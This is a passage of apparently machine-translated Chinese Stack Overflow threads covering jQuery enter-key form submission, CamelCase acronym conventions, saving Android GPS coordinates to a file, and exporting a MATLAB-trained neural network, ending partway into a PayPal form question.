> 时间：2013-03-20T14:17:58.717
> 
> 标签：jquery, file-upload

首先非常感谢制作文件上传这样出色的工具的人。我在具有其他一些不同输入字段的表单上使用文件上传（autoUpload：true），并且由于文件上传，当我按下“输入”键时，没有任何反应，而我希望提交我的所有表单。

这可能吗 ？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:18:57.960

尝试`keyUp`附加到身体的事件。13 是回车键的键码。

```
$("body").keyup(function (e) {
    var code = (e.keyCode ? e.keyCode : e.which)
    if(code == 13) {
        $("form").submit();
    }
}); 
```

如果您想要其他密钥代码，请参阅[此处](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

# language-agnostic - CamelCase 中的首字母缩略词

> ID：15526107
> 
> 赞同：319
> 
> 时间：2013-03-20T14:18:10.593
> 
> 标签：language-agnostic, coding-style, camelcasing, acronym

我对 CamelCase 有疑问。假设你有这个缩写：`Unesco = United Nations Educational, Scientific and Cultural Organization.`

你应该写：`unitedNationsEducationalScientificAndCulturalOrganization`

但是，如果您需要编写首字母缩写词怎么办？就像是：

```
getUnescoProperties(); 
```

这样写合适吗？`getUnescoProperties()`或者`getUNESCOProperties();`

* * *

## 回答 #1

> 赞同：388
> 
> 时间：2014-11-27T13:36:40.783

已接受的答案对[Microsoft 的建议提出](http://msdn.microsoft.com/en-us/library/141e06ef%28v=vs.71%29.aspx)了合理的批评。

*   根据字符数对首字母缩写词/首字母缩写词的处理不一致：
    *   `playerID`对比`playerId`对比`playerIdentifier`_
*   如果两个字母的首字母缩写词出现在标识符的开头，它们是否仍应大写的问题：
    *   `USTaxes`对比`usTaxes`
*   难以区分多个首字母缩略词：
    *   即`USID`vs `usId`（或`parseDBMXML`在维基百科的示例中）。

因此，我将发布此答案作为已接受答案的替代方法。所有首字母缩略词都应一致处理；首字母缩略词应与任何其他词一样对待。[引用维基百科](http://en.wikipedia.org/wiki/CamelCase#Programming_and_coding)：

> ...一些程序员更喜欢将缩写词视为小写单词...

所以回复：OP的问题，我同意接受的答案；这是对的：`getUnescoProperties()`

但我想我会在这些例子中得出不同的结论：

*   `US Taxes`→`usTaxes`
*   `Player ID`→`playerId`

**~~因此，如果您认为两个字母的首字母缩略词应该像其他首字母缩略词一样对待，请投票给这个答案~~**.

~~Camel Case 是一种约定，而不是规范。所以我猜流行的意见规则。~~

（**编辑：**删除投票应该决定这个问题的建议；正如@Brian David 所说；Stack Overflow 不是“人气竞赛”，这个问题被关闭为“基于意见”）

尽管许多人更喜欢将首字母缩略词视为任何其他词，但更常见的做法可能是将首字母缩略词全部大写（即使它会导致“可憎”）

*   [请参阅此XML 模式](https://github.com/google/cap-library/blob/master/schema/feed/edxlde-1_0.xsd#L7)中的“EDXML”
*   [请参阅此XBRL 模式](http://xbrl.fasb.org/us-gaap/2014/elts/us-gaap-2014-01-31.xsd)中的“SFAS158”

**其他资源：**

*   注意有些人区分缩写和首字母缩略词
*   注意 Microsoft 指南区分两个字符的首字母缩写词和“长度超过两个字符的首字母缩写词”
*   请注意，有些人建议完全避免使用缩写词/首字母缩略词
*   注意有些人建议完全避免 CamelCase / PascalCase
*   请注意，有些人将“一致性”区分为“内部不一致的规则”（即处理两个字符的首字母缩写词与三个字符的首字母缩写词不同）；有些人将“一致性”定义为“一致地应用相同的规则”（即使规则内部不一致）
*   [框架设计指南](https://rads.stackoverflow.com/amzn/click/com/0321545613)
*   [微软指南](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-1.1/141e06ef(v=vs.71)?redirectedfrom=MSDN)

* * *

## 回答 #2

> 赞同：255
> 
> 时间：2013-03-20T14:35:14.540

微软编写的一些[指导方针](http://msdn.microsoft.com/en-us/library/141e06ef%28v=vs.71%29.aspx)`camelCase`是：

> 使用首字母缩略词时，对于长度超过两个字符的首字母缩略词，请使用 Pascal 大小写或驼峰大小写。例如，使用`HtmlButton`或`htmlButton`。但是，您应该将仅包含两个字符的首字母缩略词大写，例如`System.IO`代替`System.Io`.
> 
> 不要在标识符或参数名称中使用缩写。如果您必须使用缩写，对包含两个以上字符的缩写使用驼峰式大小写，即使这与单词的标准缩写相矛盾。

加起来：

*   当您使用两个字符长的缩写或首字母缩略词时，请将它们全部大写；

*   当首字母缩写词超过两个字符时，第一个字符使用大写字母。

所以，在你的具体情况下，`getUnescoProperties()`是正确的。

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2017-08-01T14:38:23.370

要转换为 CamelCase，还有[Google 的（几乎）确定性 Camel 案例算法](https://google.github.io/styleguide/jsguide.html#naming-camel-case-defined)：

> 从名字的散文形式开始：
> 
> 1.  将短语转换为纯 ASCII 并删除任何撇号。例如，“Müller 算法”可能会变成“Muellers 算法”。
> 2.  将此结果划分为单词、空格和任何剩余的标点符号（通常是连字符）。
>     1.  推荐：如果任何单词在常用用法中已经具有常规的驼峰式外观，请将其拆分为其组成部分（例如，“AdWords”变为“广告词”）。请注意，诸如“iOS”之类的词本身并不是真正的驼峰式；它违反了任何惯例，因此该建议不适用。
> 3.  现在小写所有内容（包括首字母缩写词），然后只大写以下字符的第一个字符：
>     1.  …每个单词，产生大写驼峰式，或
>     2.  …除第一个单词外的每个单词，以产生小驼峰式大小写
> 4.  最后，将所有单词连接成一个标识符。
> 
> 请注意，原始单词的大小写几乎完全被忽略。

在以下示例中，“XML HTTP 请求”正确转换为 XmlHttpRequest，但 XMLHTTPRequest 不正确。

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2016-06-28T08:28:54.877

`getUnescoProperties()`应该是最好的解决方案...

如果可能的话就用纯`camelCase`字母，当你有首字母缩写词时，如果可能的话就让它们大写，否则就不用了`camelCase`。

通常在 OO 编程中，变量应以小写字母 ( `lowerCamelCase`) 开头，类应以大写字母 ( `UpperCamelCase`) 开头。

如有疑问，请纯洁`camelCase`；）

`parseXML`还`parseXml`可以`camelCase`

`XMLHTTPRequest`应该`XmlHttpRequest`或`xmlHttpRequest`没有办法使用随后的大写首字母缩略词，对于所有测试用例来说，它肯定是不明确的。

例如，你怎么读这个词`HTTPSSLRequest`, `HTTP + SSL`, or `HTTPS + SL`（这并不意味着...），在这种情况下遵循骆驼大小写约定并使用`httpSslRequest`or `httpsSlRequest`，也许它不再好，但它肯定更清楚。

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2017-08-24T11:11:59.337

github 上有[airbnb JavaScript 样式指南](https://github.com/airbnb/javascript)，其中有很多星星（目前约为 57.5k），并提供有关[首字母缩略词](https://github.com/airbnb/javascript#naming--Acronyms-and-Initialisms)的指南：

> 首字母缩写词和首字母缩写词应始终全部大写或全部小写。
> 
> 为什么？名称是为了便于阅读，而不是为了安抚计算机算法。

```
// bad
import SmsContainer from './containers/SmsContainer';

// bad
const HttpRequests = [
  // ...
];

// good
import SMSContainer from './containers/SMSContainer';

// good
const HTTPRequests = [
  // ...
];

// also good
const httpRequests = [
  // ...
];

// best
import TextMessageContainer from './containers/TextMessageContainer';

// best
const requests = [
  // ...
]; 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2018-03-16T18:21:18.857

除了@valex 所说的，我想用这个问题的给定答案来回顾一些事情。

我认为一般的答案是：这取决于您使用的编程语言。

# C夏普

Microsoft[已经编写](https://msdn.microsoft.com/en-us/library/141e06ef(v=vs.71).aspx)了一些指导方针，似乎这`HtmlButton`是为这种情况命名类的正确方法。

# Javascript

Javascript 有一些带有首字母缩略词的全局变量，并且它都以大写形式使用它们（但有趣的是，并不总是一致）这里有一些示例：

`encodeURIComponent` `XMLHttpRequest` `toJSON` `toISOString`

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2017-07-12T20:05:01.340

目前我正在使用以下规则：

1.  首字母缩略词大写：`XMLHTTPRequest`, `xmlHTTPRequest`, `requestIPAddress`.

2.  驼峰式缩写：`ID[entifier]`, `Exe[cutable]`, `App[lication]`.

`ID`是一个例外，对不起，但确实如此。

当我看到一个大写字母时，我假设一个首字母缩略词，即每个字母都有一个单独的单词。每个字母的缩写没有单独的单词，所以我使用驼峰式。

`XMLHTTPRequest`是模棱两可的，但它是一种罕见的情况，它并没有那么模棱两可，所以没关系，规则和逻辑比美丽更重要。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-02-01T23:49:23.920

JavaScript Airbnb 样式指南[对此进行了一些讨论](https://github.com/airbnb/javascript#naming--Acronyms-and-Initialisms)。基本上：

```
// bad
const HttpRequests = [ req ];

// good
const httpRequests = [ req ];

// also good
const HTTPRequests = [ req ]; 
```

因为我通常会在课堂上阅读前导大写字母，所以我倾向于避免这种情况。归根结底，这都是偏好。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-05-23T07:00:47.293

免责声明：英语不是我的母语。但是这个问题我想了很久，尤其是在使用节点（驼峰式）处理数据库时，因为表字段的名称应该被蛇化，这是我的想法：

程序员有两种“首字母缩写词”：

*   自然语言，联合国教科文组织
*   例如，在计算机编程语言中`tmc and textMessageContainer`，它通常显示为局部变量。

在编程世界中，自然语言中的所有首字母缩写词都应该被视为**word**，原因是：

1.  当我们编程时，我们应该以首字母缩写形式或非首字母缩写形式命名一个变量。因此，如果我们将函数命名为 getUNESCOProperties，则意味着 UNESCO 是一个首字母缩略词（否则它不应该都是大写字母），但显然`get`不是`properties`首字母缩略词。因此，我们应该将此函数命名为**gunescop**或**getUnitedNationsEducationalScientificAndCulturalOrganizationProperties**，两者都是不可接受的。

2.  自然语言在不断发展， [今天的缩略词明天就会变成单词](http://mentalfloss.com/article/61329/25-words-are-actually-acronyms)，但程序应该独立于这种趋势，永远屹立不倒。

顺便说一句，在投票最多的答案中，IO 是计算机语言含义中的首字母缩写词（代表 InputOutput），但我不喜欢这个名字，因为我认为首字母缩写词（计算机语言中）应该只用于命名一个局部变量但是一个顶级类/函数，所以应该使用 InputOutput 而不是 IO

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-05-12T14:10:36.547

还有另一种驼峰式约定，它试图通过使用大写 ( `HTML`) 或小写 ( `html`) 来提高首字母缩写词的可读性，但避免同时使用 ( `Html`)。

所以在你的情况下你可以写`getUNESCOProperties`. 您也可以`unescoProperties`为变量或`UNESCOProperties`类编写（类的约定是以大写开头）。

如果您想将两个首字母缩略词放在一起，例如对于名为 XML HTTP Request 的类，此规则会变得很棘手。它将以大写开头，但由于`XMLHTTPRequest`不容易阅读（它是 XMLH TTP 请求吗？），并且`XMLhttpRequest`会破坏驼峰式约定（它是 XM Lhttp 请求吗？），最好的选择是混合大小写：`XMLHttpRequest`，即实际上[W3C 使用](https://www.w3.org/TR/XMLHttpRequest1/)了什么。但是，不鼓励使用这种命名。对于此示例，`HTTPRequest`将是一个更好的名称。

由于标识/身份的官方英文单词似乎是 ID，虽然不是首字母缩略词，但您可以在那里应用相同的规则。

这个约定似乎在那里很流行，但这只是一个约定，没有对错之分。只需尝试遵守约定并确保您的名字可读。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-07-16T18:36:32.210

联合国教科文组织是一个特例，因为它通常（用英语）读成一个单词而不是首字母缩略词 - 像 UEFA、RADA、BAFTA 和 BBC、HTML、SSL 不同

# android - 从 onMyLocationChange 函数中的“onMyLocationChange”函数保存 gps 位置

> ID：15526110
> 
> 赞同：0
> 
> 时间：2013-03-20T14:18:17.067
> 
> 标签：android

我有一个显示谷歌地图 v2 的活动。在那里，我有一些单选按钮，当我按下“保存”按钮时，我想保存我当前的位置。这个按钮在“onMyLocationChange”功能中。

问题是纬度和经度在“onMyLocationChange”函数内。

活动是：

```
public class selection extends FragmentActivity implements OnMyLocationChangeListener{

    GoogleMap googleMap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.selection);

        // Getting Google Play availability status
        int status = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getBaseContext());

        // Showing status
        if(status!=ConnectionResult.SUCCESS){ // Google Play Services are not available
            int requestCode = 10;
            Dialog dialog = GooglePlayServicesUtil.getErrorDialog(status, this, requestCode);
            dialog.show();

        }else {    // Google Play Services are available

            // Getting reference to the SupportMapFragment of activity_main.xml
            SupportMapFragment mapFragment  = (SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map);

            // Getting GoogleMap object from the fragment
            googleMap = mapFragment.getMap();
            //set map type
            googleMap.setMapType(GoogleMap.MAP_TYPE_NORMAL);

            // Enabling MyLocation Layer of Google Map
            googleMap.setMyLocationEnabled(true);

            // Setting event handler for location change
            googleMap.setOnMyLocationChangeListener(this);

        RadioGroup rgViews = (RadioGroup) findViewById(R.id.rg_views);

        rgViews.setOnCheckedChangeListener(new OnCheckedChangeListener() {

            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                if(checkedId == R.id.rb_normal){
                    googleMap.setMapType(GoogleMap.MAP_TYPE_NORMAL);
                }else if(checkedId == R.id.rb_satellite){
                    googleMap.setMapType(GoogleMap.MAP_TYPE_SATELLITE);
                }else if(checkedId == R.id.rb_terrain){
                    googleMap.setMapType(GoogleMap.MAP_TYPE_TERRAIN);
                }
                else if(checkedId == R.id.save_location){

                    //here I want to save the location
                }
            }
        });
        }
    }

    @Override
    public void onMyLocationChange(Location location) {
        TextView tvLocation = (TextView) findViewById(R.id.tv_location);

        // Getting latitude of the current location
        double latitude = location.getLatitude();

        // Getting longitude of the current location
        double longitude = location.getLongitude();

        // Creating a LatLng object for the current location
        LatLng latLng = new LatLng(latitude, longitude);

        // Showing the current location in Google Map
        googleMap.moveCamera(CameraUpdateFactory.newLatLng(latLng));

        // Zoom in the Google Map
        googleMap.animateCamera(CameraUpdateFactory.zoomTo(15));

        // Setting latitude and longitude in the TextView tv_location
        tvLocation.setText("Latitude:" +  latitude  + ", Longitude:"+ longitude );

    }

} 
```

- - - - -更新 - - - - - - - - - - - - - -

```
else if(checkedId == R.id.save_location){

                    FileOutputStream fos;

                    File filePath = new File(Environment.getExternalStorageDirectory() + "/What_Where.txt");

                    try {
                        fos = new FileOutputStream(filePath);
                        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fos));
                        bw.write(latitude);
                        bw.write(longitude);
                        fos.flush();
                        fos.close();
                    } catch (FileNotFoundException e) {
                        Log.e("Saving", e.getMessage(), e);
                    } catch (IOException e) {
                        Log.e("Saving", e.getMessage(), e);
                    } 
```

它给了我 "bw.write" 。该方法不适用于双参数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:24:01.027

```
 GoogleMap googleMap;
    double latitude=0.0;  <--- Declare as Global variable
    double longitude=0.0; <--- Declare as Global variable

public void onMyLocationChange(Location location) {

        latitude = location.getLatitude();
        longitude = location.getLongitude();
        ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:03:30.467

试试这个

```
bw.write(String.valueOf(latitude));
bw.write(String.valueOf(longitude)); 
```

**编辑**

使用它来写入文件

```
File filePath = new File(Environment.getExternalStorageDirectory() +"/What_Where.txt");
    try {
        BufferedWriter bw = new BufferedWriter(new FileWriter(filePath, true));
        bw.append(String.valueOf(latitude));
        bw.append(String.valueOf(longitude));
        bw.close();
    } catch (FileNotFoundException e) {
        Log.e("Saving", e.getMessage(), e);
    } catch (IOException e) {
        Log.e("Saving", e.getMessage(), e);
    } 
```

这对我有用。

希望这对您有所帮助。

# matlab - 导出使用 MATLAB 以其他编程语言训练的神经网络

> ID：15526112
> 
> 赞同：15
> 
> 时间：2013-03-20T14:18:19.047
> 
> 标签：matlab, neural-network, porting

我使用 MATLAB 神经网络工具箱训练了一个神经网络，特别是使用命令`nprtool`，它提供了一个简单的 GUI 来使用工具箱功能，并导出一个`net`包含有关生成的 NN 信息的对象。

通过这种方式，我创建了一个可以用作分类器的工作神经网络，表示它的图表如下：

![表示神经网络的图表](../Images/e4c4536cd4d7471d758b18551f60312d.png)

有 200 个输入，第一个隐藏层中有 20 个神经元，最后一层有 2 个神经元提供二维输出。

我想要做的是在其他一些编程语言（C#、Java、...）中使用网络。

为了解决这个问题，我尝试在 MATLAB 中使用以下代码：

```
y1 = tansig(net.IW{1} * input + net.b{1});
Results = tansig(net.LW{2} * y1 + net.b{2}); 
```

假设这是一个包含 200 个元素的一维数组，如果是 20x200 矩阵（20 个神经元，200 个权重）`input`，前面的代码就可以工作。`net.IW{1}`

问题是我注意到它`size(net.IW{1})`返回了意外的值：

```
>> size(net.IW{1})

    ans =

    20   199 
```

我在具有 10000 个输入的网络上遇到了同样的问题。在这种情况下，结果不是 20x10000，而是类似于 20x9384（我不记得确切的值）。

所以，问题是：如何获得每个神经元的权重？在那之后，有人可以解释我如何使用它们来产生相同的 MATLAB 输出吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-21T01:24:12.590

我解决了上述问题，我认为分享我所学到的东西很有用。

**前提**

首先，我们需要一些定义。让我们考虑下图，取自 [1]：

![一种神经网络方案](../Images/033b6a671c7bdee85dbe4773f2e1de07.png)

在上图中，**IW**代表*初始权重*：它们代表**第 1 层神经元的权重**，每个神经元都与每个输入相连，如下图所示 [1]：

![所有神经元都与所有输入相连](../Images/c20911414b94d94dd4e752f9b426d14e.png)

所有其他权重，称为*层权重*（第一个图中的**LW**），它们也与前一层的每个输出相连。在我们的研究案例中，我们使用只有两层的网络，因此我们将只使用一个 LW 阵列来解决我们的问题。

**问题的解决方案**

经过上面的介绍，我们可以将问题分为两步进行：

*   强制初始权重的数量与输入数组长度匹配
*   使用权重来实现和使用刚刚用其他编程语言训练的神经网络

**A - 强制初始权重的数量与输入数组长度匹配**

使用`nprtool`，我们可以训练我们的网络，并且在过程结束时，我们还可以在工作区中导出有关整个训练过程的一些信息。特别是，我们需要导出：

*   表示创建的神经网络的 MATLAB 网络对象
*   用于训练网络的输入数组
*   用于训练网络的目标数组

此外，我们需要生成一个 M 文件，其中包含 MATLAB 用于创建神经网络的代码，因为我们需要修改它并更改一些训​​练选项。

下图显示了如何执行这些操作：

![nprtool GUI 用于导出数据并生成 M 代码](../Images/73a0380b47cd111e4c91e0caf7b107f4.png)

生成的 M 代码将类似于以下代码：

```
function net = create_pr_net(inputs,targets)
%CREATE_PR_NET Creates and trains a pattern recognition neural network.
%
%  NET = CREATE_PR_NET(INPUTS,TARGETS) takes these arguments:
%    INPUTS - RxQ matrix of Q R-element input samples
%    TARGETS - SxQ matrix of Q S-element associated target samples, where
%      each column contains a single 1, with all other elements set to 0.
%  and returns these results:
%    NET - The trained neural network
%
%  For example, to solve the Iris dataset problem with this function:
%
%    load iris_dataset
%    net = create_pr_net(irisInputs,irisTargets);
%    irisOutputs = sim(net,irisInputs);
%
%  To reproduce the results you obtained in NPRTOOL:
%
%    net = create_pr_net(trainingSetInput,trainingSetOutput);

% Create Network
numHiddenNeurons = 20;  % Adjust as desired
net = newpr(inputs,targets,numHiddenNeurons);
net.divideParam.trainRatio = 75/100;  % Adjust as desired
net.divideParam.valRatio = 15/100;  % Adjust as desired
net.divideParam.testRatio = 10/100;  % Adjust as desired

% Train and Apply Network
[net,tr] = train(net,inputs,targets);
outputs = sim(net,inputs);

% Plot
plotperf(tr)
plotconfusion(targets,outputs) 
```

在开始训练过程之前，我们需要**删除**MATLAB 对输入和输出执行的所有预处理和后处理函数。这可以通过在行之前添加以下行来完成`% Train and Apply Network`：

```
net.inputs{1}.processFcns = {};
net.outputs{2}.processFcns = {}; 
```

在对函数进行这些更改之后`create_pr_net()`，我们可以简单地使用它来创建最终的神经网络：

```
net = create_pr_net(input, target); 
```

其中`input`和`target`是我们通过 导出的值`nprtool`。

这样，我们可以确定权重的数量等于输入数组的长度。此外，此过程对于简化向其他编程语言的移植很有用。

**B - 实现和使用刚刚用其他编程语言训练的神经网络**

通过这些更改，我们可以定义如下函数：

```
function [ Results ] = classify( net, input )
    y1 = tansig(net.IW{1} * input + net.b{1});

    Results = tansig(net.LW{2} * y1 + net.b{2});
end 
```

在这段代码中，我们使用了上面提到的 IW 和 LW 数组，还有*偏置*b，在`nprtool`. 在这种情况下，我们不关心[偏见的作用](https://stackoverflow.com/questions/2480650/role-of-bias-in-neural-networks)；简单地说，我们需要使用它们，因为`nprtool`它确实如此。

现在，我们可以使用`classify()`上面定义的函数，或者`sim()`同样使用函数，得到相同的结果，如下例所示：

```
>> sim(net, input(:, 1))

ans =

    0.9759
   -0.1867
   -0.1891

>> classify(net, input(:, 1))

ans =

   0.9759   
  -0.1867
  -0.1891 
```

显然，该`classify()`函数可以被解释为伪代码，然后在任何可能定义 MATLAB`tansig()`函数 [2] 和数组之间的基本操作的编程语言中实现。

**参考**

[1] [Howard Demuth、Mark Beale、Martin Hagan：*神经网络工具箱 6 - 用户指南*，MATLAB](http://filer.case.edu/pjt9/b378s10/nnet.pdf)

[2] [Mathworks，*tansig - 双曲正切 sigmoid 传递函数*，MATLAB 文档中心](http://www.mathworks.it/it/help/nnet/ref/tansig.html)

**补充笔记**

查看[机器人的答案](https://stackoverflow.com/questions/15526112/export-a-neural-network-trained-with-matlab-in-other-programming-languages/21584220#21584220)和Sangeun [Chi 的答案](https://stackoverflow.com/questions/15526112/export-a-neural-network-trained-with-matlab-in-other-programming-languages/23319086#23319086)以获取更多详细信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-05T17:27:46.113

这是对伟大的 Vito Gentile 答案的一个小改进。

如果你想**使用预处理和后处理' *mapminmax* '**函数，你必须注意，因为Matlab中的'mapminmax'是按行而不是按列规范化的！

这是您需要添加到上层“分类”功能的内容，以保持一致的预处理/后处理：

```
[m n] = size(input);
ymax = 1;
ymin = -1;
for i=1:m
   xmax = max(input(i,:));
   xmin = min(input(i,:));
   for j=1:n
     input(i,j) = (ymax-ymin)*(input(i,j)-xmin)/(xmax-xmin) + ymin;
   end
end 
```

这在函数的末尾：

```
ymax = 1;
ymin = 0;
xmax = 1;
xmin = -1;
Results = (ymax-ymin)*(Results-xmin)/(xmax-xmin) + ymin; 
```

这是 Matlab 代码，但可以很容易地作为伪代码阅读。希望这会有所帮助！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-04-27T03:34:10.093

感谢 VitoShadow 和机器人回答，我可以将 Matlab 神经网络值导出到其他应用程序。

我真的很感激他们，但我在他们的代码中发现了一些微不足道的错误，并想更正它们。

1) 在 VitoShadow 代码中，

```
Results = tansig(net.LW{2} * y1 + net.b{2});
-> Results = net.LW{2} * y1 + net.b{2}; 
```

2) 在机器人预处理代码中，从网络变量中提取 xmax 和 xmin 比计算它们更容易。

```
xmax = net.inputs{1}.processSettings{1}.xmax
xmin = net.inputs{1}.processSettings{1}.xmin 
```

3）在机器人后处理代码中，

```
xmax = net.outputs{2}.processSettings{1}.xmax
xmin = net.outputs{2}.processSettings{1}.xmin

Results = (ymax-ymin)*(Results-xmin)/(xmax-xmin) + ymin;
-> Results = (Results-ymin)*(xmax-xmin)/(ymax-ymin) + xmin; 
```

您可以手动检查并确认这些值，如下所示：

```
p2 = mapminmax('apply', net(:, 1), net.inputs{1}.processSettings{1}) 
```

-> 预处理数据

```
y1 = purelin ( net.LW{2} * tansig(net.iw{1}* p2 + net.b{1}) + net.b{2}) 
```

-> 神经网络处理数据

```
y2 = mapminmax( 'reverse' , y1, net.outputs{2}.processSettings{1}) 
```

-> 后处理数据

参考： http: [//www.mathworks.com/matlabcentral/answers/14517-processing-of-ip-data](http://www.mathworks.com/matlabcentral/answers/14517-processing-of-i-p-data)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-12-06T07:28:08.843

我尝试使用 OpenCV 在 C++ 中实现一个简单的 2 层 NN，然后将权重导出到运行良好的 Android。我写了一个小脚本，它生成一个带有学习权重的头文件，并在下面的代码中使用。

```
// Map Minimum and Maximum Input Processing Function
Mat mapminmax_apply(Mat x, Mat settings_gain, Mat settings_xoffset, double settings_ymin){

    Mat y;

    subtract(x, settings_xoffset, y);
    multiply(y, settings_gain, y);
    add(y, settings_ymin, y);

    return y;

    /* MATLAB CODE
     y = x - settings_xoffset;
     y = y .* settings_gain;
     y = y + settings_ymin;
     */
}

// Sigmoid Symmetric Transfer Function
Mat transig_apply(Mat n){
    Mat tempexp;
    exp(-2*n, tempexp);
    Mat transig_apply_result = 2 /(1 + tempexp) - 1;
    return transig_apply_result;
}

// Map Minimum and Maximum Output Reverse-Processing Function
Mat mapminmax_reverse(Mat y, Mat settings_gain, Mat settings_xoffset, double settings_ymin){

    Mat x;

    subtract(y, settings_ymin, x);
    divide(x, settings_gain, x);
    add(x, settings_xoffset, x);

    return x;

/* MATLAB CODE
function x = mapminmax_reverse(y,settings_gain,settings_xoffset,settings_ymin)
x = y - settings_ymin;
x = x ./ settings_gain;
x = x + settings_xoffset;
end
*/

}

Mat getNNParameter (Mat x1)
{

    // convert double array to MAT

    // input 1
    Mat x1_step1_xoffsetM = Mat(1, 48, CV_64FC1, x1_step1_xoffset).t();
    Mat x1_step1_gainM = Mat(1, 48, CV_64FC1, x1_step1_gain).t();
    double x1_step1_ymin = -1;

    // Layer 1
    Mat b1M = Mat(1, 25, CV_64FC1, b1).t();
    Mat IW1_1M = Mat(48, 25, CV_64FC1, IW1_1).t();

    // Layer 2
    Mat b2M = Mat(1, 48, CV_64FC1, b2).t();
    Mat LW2_1M = Mat(25, 48, CV_64FC1, LW2_1).t();

    // input 1
    Mat y1_step1_gainM = Mat(1, 48, CV_64FC1, y1_step1_gain).t();
    Mat y1_step1_xoffsetM = Mat(1, 48, CV_64FC1, y1_step1_xoffset).t();
    double y1_step1_ymin = -1;

    // ===== SIMULATION ========

    // Input 1
    Mat xp1 = mapminmax_apply(x1, x1_step1_gainM, x1_step1_xoffsetM, x1_step1_ymin);

    Mat  temp = b1M + IW1_1M*xp1;

    // Layer 1
    Mat a1M = transig_apply(temp);

    // Layer 2
    Mat a2M = b2M + LW2_1M*a1M;

    // Output 1
    Mat y1M = mapminmax_reverse(a2M, y1_step1_gainM, y1_step1_xoffsetM, y1_step1_ymin);

    return y1M;
} 
```

标题中的偏差示例可能是这样的：

```
static double b2[1][48] = {
        {-0.19879, 0.78254, -0.87674, -0.5827, -0.017464, 0.13143, -0.74361, 0.4645, 0.25262, 0.54249, -0.22292, -0.35605, -0.42747, 0.044744, -0.14827, -0.27354, 0.77793, -0.4511, 0.059346, 0.29589, -0.65137, -0.51788, 0.38366, -0.030243, -0.57632, 0.76785, -0.36374, 0.19446, 0.10383, -0.57989, -0.82931, 0.15301, -0.89212, -0.17296, -0.16356, 0.18946, -1.0032, 0.48846, -0.78148, 0.66608, 0.14946, 0.1972, -0.93501, 0.42523, -0.37773, -0.068266, -0.27003, 0.1196}}; 
```

现在，谷歌发布了 Tensorflow，这已经过时了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-09T15:16:44.397

因此解决方案变为（纠正所有部分后）

这里我在 Matlab 中给出了一个解决方案，但是如果你有 tanh() 函数，你可以很容易地将它转换为任何编程语言。它仅用于显示网络对象中的字段和您需要的操作。

*   假设您有一个训练有素的 ann（网络对象）要导出
*   假设训练出来的ann的名字是trained_ann

这是用于导出和测试的脚本。测试脚本将原始网络结果与 my_ann_evaluation() 结果进行比较

```
% Export IT
exported_ann_structure = my_ann_exporter(trained_ann);

% Run and Compare 
% Works only for single INPUT vector
% Please extend it to MATRIX version by yourself
input = [12 3 5 100];
res1 = trained_ann(input')';
res2 = my_ann_evaluation(exported_ann_structure, input')'; 
```

您需要以下两个功能的地方

*首先 my_ann_exporter*：

```
function [ my_ann_structure ] = my_ann_exporter(trained_netw)
% Just for extracting as Structure object
my_ann_structure.input_ymax = trained_netw.inputs{1}.processSettings{1}.ymax;
my_ann_structure.input_ymin = trained_netw.inputs{1}.processSettings{1}.ymin;
my_ann_structure.input_xmax = trained_netw.inputs{1}.processSettings{1}.xmax;
my_ann_structure.input_xmin = trained_netw.inputs{1}.processSettings{1}.xmin;

my_ann_structure.IW = trained_netw.IW{1};
my_ann_structure.b1 = trained_netw.b{1};
my_ann_structure.LW = trained_netw.LW{2};
my_ann_structure.b2 = trained_netw.b{2};

my_ann_structure.output_ymax = trained_netw.outputs{2}.processSettings{1}.ymax;
my_ann_structure.output_ymin = trained_netw.outputs{2}.processSettings{1}.ymin;
my_ann_structure.output_xmax = trained_netw.outputs{2}.processSettings{1}.xmax;
my_ann_structure.output_xmin = trained_netw.outputs{2}.processSettings{1}.xmin;
end 
```

*第二个 my_ann_evaluation：*

```
function [ res ] = my_ann_evaluation(my_ann_structure, input)
% Works with only single INPUT vector
% Matrix version can be implemented

ymax = my_ann_structure.input_ymax;
ymin = my_ann_structure.input_ymin;
xmax = my_ann_structure.input_xmax;
xmin = my_ann_structure.input_xmin;
input_preprocessed = (ymax-ymin) * (input-xmin) ./ (xmax-xmin) + ymin;

% Pass it through the ANN matrix multiplication
y1 = tanh(my_ann_structure.IW * input_preprocessed + my_ann_structure.b1);

y2 = my_ann_structure.LW * y1 + my_ann_structure.b2;

ymax = my_ann_structure.output_ymax;
ymin = my_ann_structure.output_ymin;
xmax = my_ann_structure.output_xmax;
xmin = my_ann_structure.output_xmin;
res = (y2-ymin) .* (xmax-xmin) /(ymax-ymin) + xmin;
end 
```

# javascript - 一页中的 2 个表单操作导致错误

> ID：15526122
> 
> 赞同：0
> 
> 时间：2013-03-20T14:18:43.683
> 
> 标签：javascript, forms, paypal

我在一页中有 2 个 Pay Pal 表格，第一个可以正常工作，但第二个返回错误：

```
TypeError: 'undefined' is not an object (evaluating 'document.secondPriceForm.submit') 
```

这是我的代码：

```
 <div id="deatails">
                         <?php while(has_sub_field("meta_data")): ?>

                            <table>
                            <!-- table row for price START-->
                            <tr>
                            <?php if(get_row_layout() == "pay_pal_data"): // layout: Content 
                                    if(get_sub_field("sold_out")):
                                    echo 'Sold out';
                                    else:?>

